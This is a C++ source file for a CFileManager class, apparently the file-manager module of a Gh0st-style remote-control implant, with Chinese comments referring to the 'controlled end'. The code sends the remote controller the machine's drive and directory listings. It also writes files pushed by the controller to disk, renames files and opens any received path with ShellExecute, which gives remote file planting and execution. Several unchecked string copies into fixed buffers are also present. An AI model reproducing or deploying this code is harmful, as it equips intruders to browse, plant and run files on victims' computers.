// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "FileManager.h"
#include "Common.h"
#include <Shellapi.h>
#include <IOSTREAM>
using namespace std;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
{
	m_ulTransferMode = TRANSFER_MODE_NORMAL;

	SendDiskDriverList();
}


ULONG CFileManager::SendDiskDriverList()              //获得被控端的磁盘信息
{
	char	szDiskDriverString[0x500] = {0};
	// 前一个字节为消息类型，后面的52字节为驱动器跟相关属性
	BYTE	szBuffer[0x1000] = {0};
	char	szFileSystem[MAX_PATH] = {0};
	char	*Travel = NULL;
	szBuffer[0] = TOKEN_DRIVE_LIST;            // 驱动器列表
	GetLogicalDriveStrings(sizeof(szDiskDriverString), szDiskDriverString);

	//获得驱动器信息
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
	//0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\.

	Travel = szDiskDriverString;

	unsigned __int64	ulHardDiskAmount = 0;   //HardDisk
	unsigned __int64	ulHardDiskFreeSpace = 0;
	unsigned long		ulHardDiskAmountMB = 0; // 总大小
	unsigned long		ulHardDiskFreeMB = 0;   // 剩余空间

	//获得驱动器信息
	//0018F460  43 3A 5C 00 44 3A 5C 00 45 3A 5C 00 46 3A  C:\.D:\.E:\.F:
	//0018F46E  5C 00 47 3A 5C 00 48 3A 5C 00 4A 3A 5C 00  \.G:\.H:\.J:\. \0

	//注意这里的dwOffset不能从0 因为0单位存储的是消息类型
	DWORD dwOffset = 1;
	for (; *Travel != '\0'; Travel += lstrlen(Travel) + 1)   //这里的+1为了过\0
	{
		memset(szFileSystem, 0, sizeof(szFileSystem));

		// 得到文件系统信息及大小
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, szFileSystem, MAX_PATH);
		ULONG	ulFileSystemLength = lstrlen(szFileSystem) + 1;    

		SHFILEINFO	sfi;
		SHGetFileInfo(Travel,FILE_ATTRIBUTE_NORMAL,&sfi,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);

		ULONG ulDiskTypeNameLength = lstrlen(sfi.szTypeName) + 1;  

		// 计算磁盘大小
		if (Travel[0] != 'A' && Travel[0] != 'B'     
			&& GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&ulHardDiskFreeSpace, 
			(PULARGE_INTEGER)&ulHardDiskAmount, NULL))
		{	
			ulHardDiskAmountMB = ulHardDiskAmount / 1024 / 1024;         //这里获得是字节要转换成G
			ulHardDiskFreeMB = ulHardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			ulHardDiskAmountMB = 0;
			ulHardDiskFreeMB = 0;
		}
		// 开始赋值
		szBuffer[dwOffset] = Travel[0];                     //盘符
		szBuffer[dwOffset + 1] = GetDriveType(Travel);      //驱动器的类型

		// 磁盘空间描述占去了8字节
		memcpy(szBuffer + dwOffset + 2, &ulHardDiskAmountMB, sizeof(unsigned long));
		memcpy(szBuffer + dwOffset + 6, &ulHardDiskFreeMB, sizeof(unsigned long));

		// 磁盘卷标名及磁盘类型
		memcpy(szBuffer + dwOffset + 10, sfi.szTypeName, ulDiskTypeNameLength);
		memcpy(szBuffer + dwOffset + 10 + ulDiskTypeNameLength, szFileSystem, 
			ulFileSystemLength);

		dwOffset += 10 + ulDiskTypeNameLength + ulFileSystemLength;
	}

	return 	m_ClientObject->OnServerSending((char*)szBuffer, dwOffset);
}

CFileManager::~CFileManager()
{
	cout<<"远程文件析构"<<endl;
}

VOID CFileManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_LIST_FILES:
		{
			SendFilesList((char*)szBuffer + 1);   //第一个字节是消息 后面的是路径
			break;
		}

	case COMMAND_FILE_SIZE:
		{
			CreateClientRecvFile(szBuffer + 1);
			break;
		}

	case COMMAND_FILE_DATA:
		{
			WriteClientRecvFile(szBuffer + 1, ulLength-1);
			break;
		}
	case COMMAND_SET_TRANSFER_MODE:
		{
			SetTransferMode(szBuffer + 1);
			break;
		}

	case COMMAND_OPEN_FILE_SHOW:
		{
			ShellExecute(NULL, "open", (char*)(szBuffer + 1), NULL, NULL, SW_SHOW);   //CreateProcess 
			break;
		}

	case COMMAND_RENAME_FILE:
		{
			szBuffer+=1;
			char* szExistingFileFullPath = NULL;
			char* szNewFileFullPath   = NULL;
			szNewFileFullPath = szExistingFileFullPath = (char*)szBuffer;

			szNewFileFullPath += strlen((char*)szNewFileFullPath)+1;

			Rename(szExistingFileFullPath,szNewFileFullPath);

			break;
		}
	}
}

//dkfj  C:\1.txt\0  D:\3.txt\0
VOID  CFileManager::Rename(char* szExistingFileFullPath,char* szNewFileFullPath)
{
	MoveFile(szExistingFileFullPath, szNewFileFullPath);
}


VOID CFileManager::SetTransferMode(LPBYTE szBuffer)
{
	memcpy(&m_ulTransferMode, szBuffer, sizeof(m_ulTransferMode));
	GetFileData();
}

//给你文件大小
VOID CFileManager::CreateClientRecvFile(LPBYTE szBuffer)    
{
	//	//[Flag 0001 0001 E:\1.txt\0 ]
	FILE_SIZE*	FileSize = (FILE_SIZE*)szBuffer;
	// 保存当前正在操作的文件名
	memset(m_szOperatingFileName, 0, 
		sizeof(m_szOperatingFileName));
	strcpy(m_szOperatingFileName, (char *)szBuffer + 8);  //已经越过消息头了

	// 保存文件长度
	m_OperatingFileLength = 
		(FileSize->dwSizeHigh * (MAXDWORD + 1)) + FileSize->dwSizeLow;

	// 创建多层目录
	MakeSureDirectoryPathExists(m_szOperatingFileName);

	WIN32_FIND_DATA wfa;
	HANDLE hFind = FindFirstFile(m_szOperatingFileName, &wfa);

	//1 2 3         1  2 3
	if (hFind != INVALID_HANDLE_VALUE
		&& m_ulTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_ulTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		BYTE	bToken[1];
		bToken[0] = TOKEN_GET_TRANSFER_MODE;
		m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));
	}
	else
	{
		GetFileData();                      //如果没有相同的文件就会执行到这里
	}
	FindClose(hFind);
}

VOID CFileManager::WriteClientRecvFile(LPBYTE szBuffer, ULONG ulLength)
{
	BYTE	*Travel;
	DWORD	dwNumberOfBytesToWrite = 0;
	DWORD	dwNumberOfBytesWirte   = 0;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILE_SIZE	*FileSize;
	// 得到数据的偏移
	Travel = szBuffer + 8;

	FileSize = (FILE_SIZE *)szBuffer;

	// 得到数据在文件中的偏移

	LONG	dwOffsetHigh = FileSize->dwSizeHigh;
	LONG	dwOffsetLow = FileSize->dwSizeLow;

	dwNumberOfBytesToWrite = ulLength - 8;

	HANDLE	hFile = 
		CreateFile
		(
		m_szOperatingFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int iRet = 0;
	// 写入文件
	iRet = WriteFile
		(
		hFile,
		Travel, 
		dwNumberOfBytesToWrite, 
		&dwNumberOfBytesWirte,
		NULL
		);

	CloseHandle(hFile);	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;//TOKEN_DATA_CONTINUE
	dwOffsetLow += dwNumberOfBytesWirte;    //
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));
}


BOOL CFileManager::MakeSureDirectoryPathExists(char* szDirectoryFullPath)   
{
	char* szTravel = NULL;
	char* szBuffer = NULL;
	DWORD dwAttributes;
	__try
	{
		szBuffer = (char*)malloc(sizeof(char)*(strlen(szDirectoryFullPath) + 1));

		if(szBuffer == NULL)
		{
			return FALSE;
		}

		strcpy(szBuffer, szDirectoryFullPath);

		szTravel = szBuffer;

		if (0)
		{
		}
		else if(*(szTravel+1) == ':') 
		{
			szTravel++;
			szTravel++;
			if(*szTravel && (*szTravel == '\\'))
			{
				szTravel++;
			}
		}

		while(*szTravel)           //\Hello\World\Shit\0
		{
			if(*szTravel == '\\')
			{
				*szTravel = '\0';
				dwAttributes = GetFileAttributes(szBuffer);   //查看是否是否目录  目录存在吗
				if(dwAttributes == 0xffffffff)
				{
					if(!CreateDirectory(szBuffer, NULL))
					{
						if(GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(szBuffer);
							return FALSE;
						}
					}
				}
				else
				{
					if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(szBuffer);
						szBuffer = NULL;
						return FALSE;
					}
				}

				*szTravel = '\\';
			}

			szTravel = CharNext(szTravel);
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		if (szBuffer!=NULL)
		{
			free(szBuffer);

			szBuffer = NULL;
		}

		return FALSE;
	}

	if (szBuffer!=NULL)
	{
		free(szBuffer);
		szBuffer = NULL;
	}
	return TRUE;
}

ULONG CFileManager::SendFilesList(char* szDirectoryPath)
{
	// 重置传输方式
	m_ulTransferMode = TRANSFER_MODE_NORMAL;	
	ULONG	ulRet = 0;
	DWORD	dwOffset = 0; // 位移指针

	char	*szBuffer = NULL;
	ULONG	ulLength  =  1024 * 10; // 先分配10K的缓冲区

	szBuffer =  (char*)LocalAlloc(LPTR, ulLength);
	if (szBuffer==NULL)
	{
		return 0;
	}

	char szDirectoryFullPath[MAX_PATH];

	wsprintf(szDirectoryFullPath, "%s\\*.*", szDirectoryPath);   

	HANDLE hFile = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA	wfd;
	hFile = FindFirstFile(szDirectoryFullPath, &wfd);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;

		if (szBuffer!=NULL)
		{

			LocalFree(szBuffer);
			szBuffer = NULL;
		}
		return m_ClientObject->OnServerSending((char*)&bToken, 1);           //路径错误
	}

	szBuffer[0] = TOKEN_FILE_LIST;

	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do 
	{
		// 动态扩展缓冲区
		if (dwOffset > (ulLength - MAX_PATH * 2))
		{
			ulLength += MAX_PATH * 2;
			szBuffer = (char*)LocalReAlloc(szBuffer, 
				ulLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		char* szFileName = wfd.cFileName;
		if (strcmp(szFileName, ".") == 0 || strcmp(szFileName, "..") == 0)
			continue;
		// 文件属性 1 字节

		//[Flag 1 HelloWorld\0大小 大小 时间 时间 
		//      0 1.txt\0 大小 大小 时间 时间]
		*(szBuffer + dwOffset) = wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		ULONG ulFileNameLength = strlen(szFileName);
		memcpy(szBuffer + dwOffset, szFileName, ulFileNameLength);
		dwOffset += ulFileNameLength;
		*(szBuffer + dwOffset) = 0;
		dwOffset++;

		// 文件大小 8 字节
		memcpy(szBuffer + dwOffset, &wfd.nFileSizeHigh, sizeof(DWORD));
		memcpy(szBuffer + dwOffset + 4, &wfd.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		memcpy(szBuffer + dwOffset, &wfd.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &wfd));

	ulRet = m_ClientObject->OnServerSending(szBuffer, dwOffset);

	LocalFree(szBuffer);
	FindClose(hFile);
	return ulRet;
}

VOID CFileManager::GetFileData()           
{
	int	nTransferMode;
	switch (m_ulTransferMode)   //如果没有相同的数据是不会进入Case中的
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;   //CreateFile（always open——eixt）
		break;
	default:
		nTransferMode = m_ulTransferMode;   //1.  2 3
	}

	WIN32_FIND_DATA wfa;
	HANDLE hFind = FindFirstFile(m_szOperatingFileName, &wfa);

	//1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 覆盖
		if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//偏移置0
			memset(bToken + 1, 0, 8);//0000 0000
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;    //进行覆盖

		}
		// 传送下一个
		else if(nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;  //0000 -1
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		memset(bToken + 1, 0, 8);  //0000 0000              //没有相同的文件会走到这里
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;    //创建一个新的文件
	}
	FindClose(hFind);

	HANDLE	hFile = 
		CreateFile
		(
		m_szOperatingFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,  //
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_OperatingFileLength = 0;
		return;
	}
	CloseHandle(hFile);

	m_ClientObject->OnServerSending((char*)&bToken, sizeof(bToken));
}
